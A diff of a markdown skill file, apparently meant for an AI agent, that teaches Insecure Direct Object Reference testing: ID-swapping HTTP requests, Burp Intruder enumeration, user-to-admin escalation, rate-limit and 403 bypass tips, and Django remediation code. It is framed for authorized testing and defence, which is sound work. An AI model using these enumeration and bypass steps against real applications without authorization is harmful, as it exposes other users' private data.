@@ -8,7 +8,6 @@ id: skill-idor-testing
 owner: [[eng-qa]]
 ---
 
-
 > AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
 # IDOR Vulnerability Testing
@@ -38,35 +37,46 @@ Provide systematic methodologies for identifying and exploiting Insecure Direct 
 ### 1. Understand IDOR Vulnerability Types
 
 #### Direct Reference to Database Objects
+
 Occurs when applications reference database records via user-controllable parameters:
 ```
+
 # Original URL (authenticated as User A)
+
 example.com/user/profile?id=2023
 
 # Manipulation attempt (accessing User B's data)
+
 example.com/user/profile?id=2022
 ```
 
 #### Direct Reference to Static Files
+
 Occurs when applications expose file paths or names that can be enumerated:
 ```
+
 # Original URL (User A's receipt)
+
 example.com/static/receipt/205.pdf
 
 # Manipulation attempt (User B's receipt)
+
 example.com/static/receipt/200.pdf
 ```
 
 ### 2. Reconnaissance and Setup
 
 #### Create Multiple Test Accounts
+
 ```
 Account 1: "attacker" - Primary testing account
 Account 2: "victim" - Account whose data we attempt to access
 ```
 
 #### Identify Object References
+
 Capture and analyze requests containing:
+
 - Numeric IDs in URLs: `/api/user/123`
 - Numeric IDs in parameters: `?id=123&action=view`
 - Numeric IDs in request body: `{"userId": 123}`
@@ -74,34 +84,49 @@ Capture and analyze requests containing:
 - GUIDs/UUIDs: `/profile/a1b2c3d4-e5f6-...`
 
 #### Map User IDs
+
 ```
+
 # Access user ID endpoint (if available)
+
 GET /api/user-id/
 
 # Note ID patterns:
+
 # - Sequential integers (1, 2, 3...)
+
 # - Auto-incremented values
+
 # - Predictable patterns
+
 ```
 
 ### 3. Detection Techniques
 
 #### URL Parameter Manipulation
+
 ```
+
 # Step 1: Capture original authenticated request
+
 GET /api/user/profile?id=1001 HTTP/1.1
 Cookie: session=attacker_session
 
 # Step 2: Modify ID to target another user
+
 GET /api/user/profile?id=1000 HTTP/1.1
 Cookie: session=attacker_session
 
 # Vulnerable if: Returns victim's data with attacker's session
+
 ```
 
 #### Request Body Manipulation
+
 ```
+
 # Original POST request
+
 POST /api/address/update HTTP/1.1
 Content-Type: application/json
 Cookie: session=attacker_session
@@ -109,15 +134,20 @@ Cookie: session=attacker_session
 {"id": 5, "userId": 1001, "address": "123 Attacker St"}
 
 # Modified request targeting victim
+
 {"id": 5, "userId": 1000, "address": "123 Attacker St"}
 ```
 
 #### HTTP Method Switching
+
 ```
+
 # Original GET request may be protected
+
 GET /api/admin/users/1000 → 403 Forbidden
 
 # Try alternative methods
+
 POST /api/admin/users/1000 → 200 OK (Vulnerable!)
 PUT /api/admin/users/1000 → 200 OK (Vulnerable!)
 ```
@@ -125,7 +155,9 @@ PUT /api/admin/users/1000 → 200 OK (Vulnerable!)
 ### 4. Exploitation with Burp Suite
 
 #### Manual Exploitation
+
 ```
+
 1. Configure browser proxy through Burp Suite
 2. Login as "attacker" user
 3. Navigate to profile/data page
@@ -134,10 +166,13 @@ PUT /api/admin/users/1000 → 200 OK (Vulnerable!)
 6. Modify ID to victim's ID
 7. Forward request
 8. Observe response for victim's data
+
 ```
 
 #### Automated Enumeration with Intruder
+
 ```
+
 1. Send request to Intruder (Ctrl+I)
 2. Clear all payload positions
 3. Select ID parameter as payload position
@@ -148,11 +183,15 @@ PUT /api/admin/users/1000 → 200 OK (Vulnerable!)
    - Step: 1
 6. Start attack
 7. Analyze responses for 200 status codes
+
 ```
 
 #### Battering Ram Attack for Multiple Positions
+
 ```
+
 # When same ID appears in multiple locations
+
 PUT /api/addresses/§5§/update HTTP/1.1
 
 {"id": §5§, "userId": 3}
@@ -164,6 +203,7 @@ Payload: Numbers 1-1000
 ### 5. Common IDOR Locations
 
 #### API Endpoints
+
 ```
 /api/user/{id}
 /api/profile/{id}
@@ -176,6 +216,7 @@ Payload: Numbers 1-1000
 ```
 
 #### File Downloads
+
 ```
 /download/invoice_{id}.pdf
 /static/receipts/{id}.pdf
@@ -184,6 +225,7 @@ Payload: Numbers 1-1000
 ```
 
 #### Query Parameters
+
 ```
 ?userId=123
 ?orderId=456
@@ -229,6 +271,7 @@ Payload: Numbers 1-1000
 ## Constraints and Limitations
 
 ### Operational Boundaries
+
 - Requires at least two valid user accounts for verification
 - Some applications use session-bound tokens instead of IDs
 - GUID/UUID references harder to enumerate but not impossible
@@ -236,12 +279,14 @@ Payload: Numbers 1-1000
 - Some IDOR requires chained vulnerabilities to exploit
 
 ### Detection Challenges
+
 - Horizontal privilege escalation (user-to-user) vs vertical (user-to-admin)
 - Blind IDOR where response doesn't confirm access
 - Time-based IDOR in asynchronous operations
 - IDOR in websocket communications
 
 ### Legal Requirements
+
 - Only test applications with explicit authorization
 - Document all testing activities and findings
 - Do not access, modify, or exfiltrate real user data
@@ -250,26 +295,35 @@ Payload: Numbers 1-1000
 ## Examples
 
 ### Example 1: Basic ID Parameter IDOR
+
 ```
+
 # Login as attacker (userId=1001)
+
 # Navigate to profile page
 
 # Original request
+
 GET /api/profile?id=1001 HTTP/1.1
 Cookie: session=abc123
 
 # Response: Attacker's profile data
 
 # Modified request (targeting victim userId=1000)
+
 GET /api/profile?id=1000 HTTP/1.1
 Cookie: session=abc123
 
 # Vulnerable Response: Victim's profile data returned!
+
 ```
 
 ### Example 2: IDOR in Address Update Endpoint
+
 ```
+
 # Intercept address update request
+
 PUT /api/addresses/5/update HTTP/1.1
 Content-Type: application/json
 Cookie: session=attacker_session
@@ -282,6 +336,7 @@ Cookie: session=attacker_session
 }
 
 # Modify userId to victim's ID
+
 {
   "id": 5,
   "userId": 1000,  # Changed from 1001
@@ -290,30 +345,40 @@ Cookie: session=attacker_session
 }
 
 # If 200 OK: Address created under victim's account
+
 ```
 
 ### Example 3: Static File IDOR
+
 ```
+
 # Download own receipt
+
 GET /api/download/5 HTTP/1.1
 Cookie: session=attacker_session
 
 # Response: PDF of attacker's receipt (order #5)
 
 # Attempt to access other receipts
+
 GET /api/download/3 HTTP/1.1
 Cookie: session=attacker_session
 
 # Vulnerable Response: PDF of victim's receipt (order #3)!
+
 ```
 
 ### Example 4: Burp Intruder Enumeration
+
 ```
+
 # Configure Intruder attack
+
 Target: PUT /api/addresses/§1§/update
 Payload Position: Address ID in URL and body
 
 Attack Configuration:
+
 - Type: Battering Ram
 - Payload: Numbers 0-20, Step 1
 
@@ -324,91 +389,122 @@ Body Template:
 }
 
 # Analyze results:
+
 # - 200 responses indicate successful modification
+
 # - Check victim's account for new addresses
+
 ```
 
 ### Example 5: Horizontal to Vertical Escalation
+
 ```
+
 # Step 1: Enumerate user roles
+
 GET /api/user/1 → {"role": "user", "id": 1}
 GET /api/user/2 → {"role": "user", "id": 2}
 GET /api/user/3 → {"role": "admin", "id": 3}
 
 # Step 2: Access admin functions with discovered ID
+
 GET /api/admin/dashboard?userId=3 HTTP/1.1
 Cookie: session=regular_user_session
 
 # If accessible: Vertical privilege escalation achieved
+
 ```
 
 ## Troubleshooting
 
 ### Issue: All Requests Return 403 Forbidden
+
 **Cause**: Server-side access control is implemented
 **Solution**:
 ```
+
 # Try alternative attack vectors:
+
 1. HTTP method switching (GET → POST → PUT)
 2. Add X-Original-URL or X-Rewrite-URL headers
 3. Try parameter pollution: ?id=1001&id=1000
 4. URL encoding variations: %31%30%30%30 for "1000"
 5. Case variations for string IDs
+
 ```
 
 ### Issue: Application Uses UUIDs Instead of Sequential IDs
+
 **Cause**: Randomized identifiers reduce enumeration risk
 **Solution**:
 ```
+
 # UUID discovery techniques:
+
 1. Check response bodies for leaked UUIDs
 2. Search JavaScript files for hardcoded UUIDs
 3. Check API responses that list multiple objects
 4. Look for UUID patterns in error messages
 5. Try UUID v1 (time-based) prediction if applicable
+
 ```
 
 ### Issue: Session Token Bound to User
+
 **Cause**: Application validates session against requested resource
 **Solution**:
 ```
+
 # Advanced bypass attempts:
+
 1. Test for IDOR in unauthenticated endpoints
 2. Check password reset/email verification flows
 3. Look for IDOR in file upload/download
 4. Test API versioning: /api/v1/ vs /api/v2/
 5. Check mobile API endpoints (often less protected)
+
 ```
 
 ### Issue: Rate Limiting Blocks Enumeration
+
 **Cause**: Application implements request throttling
 **Solution**:
 ```
+
 # Bypass techniques:
+
 1. Add delays between requests (Burp Intruder throttle)
 2. Rotate IP addresses (proxy chains)
 3. Target specific high-value IDs instead of full range
 4. Use different endpoints for same resources
 5. Test during off-peak hours
+
 ```
 
 ### Issue: Cannot Verify IDOR Impact
+
 **Cause**: Response doesn't clearly indicate data ownership
 **Solution**:
 ```
+
 # Verification methods:
+
 1. Create unique identifiable data in victim account
 2. Look for PII markers (name, email) in responses
 3. Compare response lengths between users
 4. Check for timing differences in responses
 5. Use secondary indicators (creation dates, metadata)
+
 ```
 
 ## Remediation Guidance
 
 ### Implement Proper Access Control
+
 ```python
+
 # Django example - validate ownership
+
 def update_address(request, address_id):
     address = Address.objects.get(id=address_id)
     
@@ -421,8 +517,11 @@ def update_address(request, address_id):
 ```
 
 ### Use Indirect References
+
 ```python
+
 # Instead of: /api/address/123
+
 # Use: /api/address/current-user/billing
 
 def get_address(request):
@@ -432,8 +531,11 @@ def get_address(request):
 ```
 
 ### Server-Side Validation
+
 ```python
+
 # Always validate on server, never trust client input
+
 def download_receipt(request, receipt_id):
     receipt = Receipt.objects.filter(
         id=receipt_id,
@@ -447,9 +549,11 @@ def download_receipt(request, receipt_id):
 ```
 
 ## When to Use
+
 This skill is applicable to execute the workflow or actions described in the overview.
 
 ## Sentinel Security Policy
+
 - This asset is under Sognatore Sentinel supervision.
 - Extraction of secrets via this skill is strictly forbidden.
 - All external network calls must be audited by the security engine.
